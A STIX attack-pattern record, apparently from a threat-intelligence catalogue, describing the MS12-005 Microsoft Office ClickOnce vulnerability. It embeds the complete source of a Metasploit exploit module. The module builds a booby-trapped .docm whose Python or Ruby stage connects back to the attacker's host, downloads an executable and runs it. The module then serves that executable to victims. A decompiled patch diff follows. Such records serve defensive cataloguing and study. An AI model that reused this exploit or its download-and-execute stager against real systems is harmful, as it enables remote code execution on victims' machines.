{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--321fecb5-eccd-4ad7-8aca-f3bfd08ef3f6",
    "created": "2024-08-14T16:37:31.176873Z",
    "modified": "2024-08-14T16:37:31.176877Z",
    "name": "\"MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability\"",
    "description": " This module exploits a vulnerability found in Microsoft Office's ClickOnce feature.  When handling a Macro document, the application fails to recognize certain file extensions as dangerous executables, which can be used to bypass the warning message.  This can allow attackers to trick victims into opening the malicious document, which will load up either a python or ruby payload, and finally, download and execute an executable.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms12_005.rb",
            "external_id": "ms12_005.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0013"
        },
        {
            "source_name": "reference",
            "url": "http://support.microsoft.com/default.aspx?scid=kb;EN-US;2584146"
        },
        {
            "source_name": "reference",
            "url": "http://exploitshop.wordpress.com/2012/01/14/ms12-005-embedded-object-package-allow-arbitrary-code-execution/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Microsoft Office's ClickOnce\n        feature.  When handling a Macro document, the application fails to recognize\n        certain file extensions as dangerous executables, which can be used to bypass\n        the warning message.  This can allow attackers to trick victims into opening the\n        malicious document, which will load up either a python or ruby payload, and\n        finally, download and execute an executable.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Yorick Koster', #Vuln discovery\n          'sinn3r'         #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-0013'],\n          ['OSVDB', '78207'],\n          ['MSB', 'MS12-005'],\n          ['BID', '51284'],\n          ['URL', 'http://support.microsoft.com/default.aspx?scid=kb;EN-US;2584146'],\n          ['URL', 'http://exploitshop.wordpress.com/2012/01/14/ms12-005-embedded-object-package-allow-arbitrary-code-execution/']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'DisablePayloadHandler' => false\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Microsoft Office Word 2007/2010 on Windows 7', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-01-10',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptEnum.new('INIT_PAYLOAD', [true, \"The initial payload type\", 'PYTHON', %w(RUBY PYTHON)]),\n          OptString.new(\"BODY\", [false, 'The message for the document body', '']),\n          OptString.new('FILENAME', [true, 'The Office document macro file', 'msf.docm'])\n        ])\n  end\n\n\n  #\n  # Return the first-stage payload that will download our malicious executable.\n  #\n  def get_download_exec_payload(type, lhost, lport)\n    payload_name = Rex::Text.rand_text_alpha(7)\n\n    # Padd up 6 null bytes so the first few characters won't get cut off\n    p = \"\\x00\"*6\n\n    case type\n    when :rb\n      p << %Q|\n      require 'socket'\n      require 'tempfile'\n      begin\n        cli = TCPSocket.open(\"#{lhost}\",#{lport})\n        buf = ''\n        while l = cli.gets\n          buf << l\n        end\n        cli.close\n        tmp = Tempfile.new(['#{payload_name}','.exe'])\n        t = tmp.path\n        tmp.binmode\n        tmp.write(buf)\n        tmp.close\n        exec(t)\n      rescue\n      end#|\n\n    when :py\n      p << %Q|\n      import socket\n      import tempfile\n      import os\n\n      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      s.connect((\"#{lhost}\", #{lport}))\n      buf = \"\"\n      while True:\n        data = s.recv(1024)\n        if data:\n          buf += data\n        else:\n          break\n      s.close\n      temp = tempfile.gettempdir() + \"\\\\\\\\\\\\\" + \"#{payload_name}.exe\"\n      f = open(temp, \"wb\")\n      f.write(buf)\n      f.close\n      f = None\n      os.system(temp)\n      #|\n\n    end\n\n    p = p.gsub(/^ {6}/, '')\n\n    return p\n  end\n\n\n  #\n  # Reads a file that'll be packaged.\n  # This will patch certain files on the fly, or return the original content of the file.\n  #\n  def on_file_read(fname, file)\n    f = open(file, 'rb')\n    buf = f.read\n    f.close\n\n    # Modify certain files on the fly\n    case file\n    when /oleObject1\\.bin/\n      # Patch the OLE object file with our payload\n      print_status(\"Patching OLE object\")\n      ptype = datastore['INIT_PAYLOAD'] == 'PYTHON' ? :py : :rb\n      p     = get_download_exec_payload(ptype, @ip, @port)\n      buf   = buf.gsub(/MYPAYLOAD/, p)\n\n      # Patch username\n      username = Rex::Text.rand_text_alpha(5)\n      buf = buf.gsub(/METASPLOIT/, username)\n      buf = buf.gsub(/#{Rex::Text.to_unicode(\"METASPLOIT\")}/, Rex::Text.to_unicode(username))\n\n      # Patch the filename\n      f = Rex::Text.rand_text_alpha(6)\n      buf = buf.gsub(/MYFILENAME/, f)\n      buf = buf.gsub(/#{Rex::Text.to_unicode(\"MYFILENAME\")}/, Rex::Text.to_unicode(f))\n\n      # Patch the extension name\n      ext = ptype.to_s\n      buf = buf.gsub(/MYEXT/, ext)\n      buf = buf.gsub(/#{Rex::Text.to_unicode(\"MYEXT\")}/, Rex::Text.to_unicode(ext))\n\n    when /document\\.xml/\n      print_status(\"Patching document body\")\n      # Patch the docx body\n      buf = buf.gsub(/W00TW00T/, datastore['BODY'])\n\n    end\n\n    # The original filename of __rels is actually \".rels\".\n    # But for some reason if that's our original filename, it won't be included\n    # in the archive. So this hacks around that.\n    case fname\n    when /__rels/\n      fname = fname.gsub(/\\_\\_rels/, '.rels')\n    end\n\n    yield fname, buf\n  end\n\n\n  #\n  # Packages the Office Macro Document\n  #\n  def package_docm_rex(path)\n    zip = Rex::Zip::Archive.new\n\n    Dir[\"#{path}/**/**\"].each do |file|\n      p = file.sub(path+'/','')\n\n      if File.directory?(file)\n        print_status(\"Packaging directory: #{file}\")\n        zip.add_file(p)\n      else\n        on_file_read(p, file) do |fname, buf|\n          print_status(\"Packaging file: #{fname}\")\n          zip.add_file(fname, buf)\n        end\n      end\n    end\n\n    zip.pack\n  end\n\n\n  #\n  # Return the malicious executable\n  #\n  def on_client_connect(cli)\n    print_status(\"#{cli.peerhost}:#{cli.peerport} - Sending executable (#{@exe.length.to_s} bytes)\")\n    cli.put(@exe)\n    service.close_client(cli)\n  end\n\n\n  def exploit\n    @ip    = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']\n    @port  = datastore['SRVPORT']\n\n    print_status(\"Generating our docm file...\")\n    path  = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2012-0013')\n    docm = package_docm_rex(path)\n\n    file_create(docm)\n    print_good(\"Let your victim open #{datastore['FILENAME']}\")\n\n    print_status(\"Generating our malicious executable...\")\n    @exe = generate_payload_exe\n\n    print_status(\"Ready to deliver your payload on #{@ip}:#{@port.to_s}\")\n    super\n  end\nend\n\n=begin\nmbp:win7_diff sinn3r$ diff patch/GetCurrentIcon.c vuln/GetCurrentIcon.c\n1c1\n< void *__thiscall CPackage::_GetCurrentIcon(void *this, int a2)\n---\n> const WCHAR *__thiscall CPackage::_GetCurrentIcon(void *this, int a2)\n...\n24c24\n<     if ( AssocIsDangerous(result) || !SHGetFileInfoW(pszPath, 0x80u, &psfi, 0x2B4u, 0x110u) )\n---\n>     if ( IsProgIDInList(0, result, extList, 0x11u) || !SHGetFileInfoW(pszPath, 0x80u, &psfi, 0x2B4u, 0x110u) )\n31c31\n=end\n",
    "x_mitre_disclosure_date": "2012-01-10",
    "x_mitre_platforms": [
        "win'"
    ]
}